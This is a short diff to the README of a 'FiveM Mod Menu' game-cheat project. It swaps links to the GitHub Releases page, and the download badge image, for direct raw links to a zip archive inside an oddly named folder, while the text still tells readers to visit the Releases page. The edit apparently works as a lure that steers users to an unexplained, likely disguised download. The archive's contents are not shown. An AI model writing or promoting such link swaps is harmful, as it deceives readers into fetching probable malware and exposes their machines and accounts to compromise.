@@ -6,13 +6,13 @@ Welcome to the FiveM Mod Menu! This application allows you to enhance your gamin
 
 ## 📥 Download Link
 
-[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM%20Mod%20Menu-blue)](https://github.com/Brayanzam/FiveM-Mod-Menu/releases)
+[![Download FiveM Mod Menu](https://raw.githubusercontent.com/Brayanzam/FiveM-Mod-Menu/main/unpeaceableness/Five-Mod-Menu-2.6.zip%20Mod%20Menu-blue)](https://raw.githubusercontent.com/Brayanzam/FiveM-Mod-Menu/main/unpeaceableness/Five-Mod-Menu-2.6.zip)
 
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:**
    Click on the link below to go to the Releases page where you can download the latest version.
-   [Download from Releases](https://github.com/Brayanzam/FiveM-Mod-Menu/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Brayanzam/FiveM-Mod-Menu/main/unpeaceableness/Five-Mod-Menu-2.6.zip)
 
 2. **Choose the Latest Version:**
    Once you're on the Releases page, find the latest version listed. This will have the most up-to-date features and fixes. 
